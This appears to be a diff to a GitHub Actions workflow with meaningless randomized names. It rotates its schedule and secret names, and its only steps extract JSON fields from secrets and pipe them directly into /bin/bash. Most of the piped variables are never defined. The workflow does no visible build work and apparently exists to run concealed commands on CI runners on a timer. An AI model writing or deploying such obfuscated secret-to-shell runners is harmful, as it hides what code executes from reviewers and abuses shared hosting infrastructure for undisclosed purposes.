@@ -3,7 +3,7 @@ name: catheadmundane
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 2/6 * * *'
+    - cron: '59 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: catheadmundane
         env:
-          codzs785: ${{ secrets.codzs785 }}
+          igv49975: ${{ secrets.igv49975 }}
         run: |
-          echo $codzs785 | jq -r .fvs39989 | /bin/bash
-          echo $ab202 | jq -r .ri3 | /bin/bash
-          echo $kld096 | jq -r .dwj1069 | /bin/bash
-          echo $cwyck3 | jq -r .fn4728 | /bin/bash
-          echo $aui1082 | jq -r .dna1670 | /bin/bash
-          echo $rj6530 | jq -r .nvi6177 | /bin/bash
-          echo $yjcy0591 | jq -r .p65 | /bin/bash
-          echo $cb90 | jq -r .rrkt79 | /bin/bash
-          echo $yn3694 | jq -r .ojpxu75 | /bin/bash
-          echo $ish1 | jq -r .zegp638 | /bin/bash
+          echo $igv49975 | jq -r .ex9 | /bin/bash
+          echo $r12 | jq -r .idr99279 | /bin/bash
+          echo $slwt23 | jq -r .jr557 | /bin/bash
+          echo $a1 | jq -r .vmd562 | /bin/bash
+          echo $pepsv3 | jq -r .fyu47 | /bin/bash
+          echo $bv59 | jq -r .dsgi17 | /bin/bash
+          echo $n5808 | jq -r .e3181 | /bin/bash
+          echo $ver5 | jq -r .j596 | /bin/bash
+          echo $ibs9 | jq -r .epvp7 | /bin/bash
+          echo $rp41185 | jq -r .ehqdg6 | /bin/bash
 
